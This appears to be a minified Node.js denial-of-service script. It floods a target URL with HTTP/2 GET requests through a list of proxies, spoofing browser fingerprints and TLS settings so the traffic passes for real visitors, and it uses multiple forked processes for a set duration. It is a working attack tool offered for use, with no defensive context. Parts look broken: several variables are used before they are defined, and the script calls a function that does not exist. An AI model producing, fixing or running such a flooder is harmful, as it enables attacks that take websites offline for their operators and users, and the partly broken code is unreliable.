(function () {})();
const a = require("net");
const b = require("http2");
const c = require("tls");
const d = require("cluster");
setInterval(function () {
  _0x373b87();
}, 4000);
const e = require("url");
const f = require("crypto");
const g = require("fs");
const {
  HeaderGenerator: h
} = require("header-generator");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (a) {});
if (process.argv.length < 7) {
  console.log("Usage: target time rate thread proxyfile");
  process.exit();
}
const i = {
  ":method": "GET",
  ":authority": Q.host,
  ":scheme": "https",
  ":path": Q.path + "?" + m(5) + "=" + m(15),
  "accept-encoding": N,
  "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": "Windows",
  "upgrade-insecure-requests": "1",
  "user-agent": J,
  accept: L,
  "accept-language": M,
  referer: K,
  "sec-fetch-dest": "document",
  "sec-fetch-site": u["sec-fetch-site"],
  "sec-fetch-mode": "navigate",
  TE: "trailers",
  "sec-fetch-user": "?1",
  DNT: "1",
  "X-Requested-With": "XMLHttpRequest"
};
function j(a) {
  return g.readFileSync(a, "utf-8").toString().split(/\r?\n/);
}
function k(a, b) {
  return Math.floor(Math.random() * (b - a) + a);
}
function l(a) {
  return a[k(0, a.length)];
}
function m(a) {
  const b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let c = "";
  const d = b.length;
  for (let e = 0; e < a; e++) {
    c += b.charAt(Math.floor(Math.random() * d));
  }
  return c;
}
const n = () => {
  const a = () => {
    return Math.floor(Math.random() * 255);
  };
  return a() + "." + a() + "." + a() + "." + a();
};
const o = n();
const p = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  Rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxyFile: process.argv[6]
};
const q = {
  name: "firefox",
  minVersion: 112,
  httpVersion: "2"
};
const r = {
  name: "chrome",
  minVersion: 112,
  httpVersion: "2"
};
const s = {
  browsers: [q, r],
  devices: ["mobile", "desktop"],
  operatingSystems: ["linux", "windows", "macos"]
};
let t = new h(s);
let u = t.getHeaders();
const v = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"];
const w = v.join(":");
const x = ["ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"];
const y = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9", "text/html; charset=utf-8", "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"];
lang_header = ["ko-KR", "en-US", "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA", "en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA", "en-IN", "en-PH", "en-SG", "en-HK", "en-GB,en;q=0.8", "en-GB,en;q=0.9", " en-GB,en;q=0.7", "*", "en-US,en;q=0.5", "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "utf-8, iso-8859-1;q=0.5, *;q=0.1", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-GB, en-US, en;q=0.9", "de-AT, de-DE;q=0.9, en;q=0.5", "cs;q=0.5", "da, en-gb;q=0.8, en;q=0.7", "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9", "de-CH;q=0.7", "tr", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"];
const z = ["*", "*/*", "gzip", "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", "br", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip;q=1.0, identity; q=0.5, *;q=0", "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", "identity", "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", "deflate"];
const A = ["max-age=604800", "proxy-revalidate", "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", "s-maxage=604800", "max-stale", "public, immutable, max-age=31536000", "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", "max-age=31536000,public", "min-fresh", "private", "public", "s-maxage", "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", "no-transform", "max-age=31557600", "stale-if-error", "only-if-cached", "max-age=0"];
const B = ["https://thanhdieu.com/"];
const C = f.constants.defaultCoreCipherList.split(":");
const D = "GREASE:" + [C[2], C[1], C[0], ...C.slice(3)].join(":");
const E = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.1134 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5563 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.6434 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.8372 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5767 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.9821 Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.542.0.234 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.8364 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5124 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.6133 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5237 Safari/537.36"];
platform = ["Linux", "macOS", "Windows"];
version = ["\"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"", "\"Not_A Brand\";v=\"8\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"86\", \"Chromium\";v=\"86\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\"", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\""];
var F = x[Math.floor(Math.floor(Math.random() * x.length))];
var G = v[Math.floor(Math.floor(Math.random() * v.length))];
var H = version[Math.floor(Math.floor(Math.random() * version.length))];
var I = platform[Math.floor(Math.floor(Math.random() * platform.length))];
var J = E[Math.floor(Math.floor(Math.random() * E.length))];
var K = B[Math.floor(Math.floor(Math.random() * B.length))];
var L = y[Math.floor(Math.floor(Math.random() * y.length))];
var M = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var N = z[Math.floor(Math.floor(Math.random() * z.length))];
var O = A[Math.floor(Math.floor(Math.random() * A.length))];
var P = j(p.proxyFile);
const Q = e.parse(p.target);
if (d.isMaster) {
  for (let a = 1; a <= p.threads; a++) {
    d.fork();
  }
} else {
  setInterval(T);
}
class R {
  constructor() {}
  HTTP(b, c) {
    const d = b.address.split(":");
    const e = d[0];
    const f = "CONNECT " + b.address + ":443 HTTP/1.1\r\nHost: " + b.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const g = new Buffer.from(f);
    const h = {
      host: b.host,
      port: b.port
    };
    const i = a.connect(h);
    i.setTimeout(b.timeout * 600000);
    i.setKeepAlive(true, 100000);
    i.on("connect", () => {
      i.write(g);
    });
    i.on("data", a => {
      const b = a.toString("utf-8");
      const d = b.includes("HTTP/1.1 200");
      if (d === false) {
        i.destroy();
        return c(undefined, "error: invalid response from proxy server");
      }
      return c(i, undefined);
    });
    i.on("timeout", () => {
      i.destroy();
      return c(undefined, "error: timeout exceeded");
    });
    i.on("error", a => {
      i.destroy();
      return c(undefined, "error: " + a);
    });
  }
}
const S = new R();
function T() {
  const a = l(P);
  const d = a.split(":");
  const e = {
    host: d[0],
    port: ~~d[1],
    address: Q.host + ":443",
    timeout: 100
  };
  S.HTTP(e, (a, d) => {
    if (d) {
      return;
    }
    a.setKeepAlive(true, 600000);
    const e = {
      host: Q.host,
      secure: true,
      ALPNProtocols: ["h2"],
      sigals: G,
      socket: a,
      ecdhCurve: "prime256v1:X25519",
      ciphers: c.getCiphers().join(":") + F,
      rejectUnauthorized: false,
      servername: Q.host,
      secureProtocol: "TLS_method"
    };
    e.host = Q.host;
    const f = c.connect(443, Q.host, e);
    f.setKeepAlive(true, 60000);
    const g = {
      headerTableSize: 65536,
      maxConcurrentStreams: 2000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 65536,
      enablePush: false
    };
    const h = {
      protocol: "https:",
      settings: g,
      maxSessionMemory: 3333,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => f,
      socket: a
    };
    const j = b.connect(Q.href, h);
    const k = {
      headerTableSize: 65536,
      maxConcurrentStreams: 2000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 65536,
      enablePush: false
    };
    j.settings(k);
    j.on("connect", () => {
      const a = setInterval(() => {
        for (let a = 0; a < p.Rate; a++) {
          const a = j.request(i).on("response", b => {
            a.close();
            a.destroy();
            return;
          });
          a.end();
        }
      }, 500);
    });
    j.on("close", () => {
      j.destroy();
      a.destroy();
      return;
    });
  });
  (function (a, b, c) {});
}
const U = () => process.exit(1);
setTimeout(U, p.time * 1000);
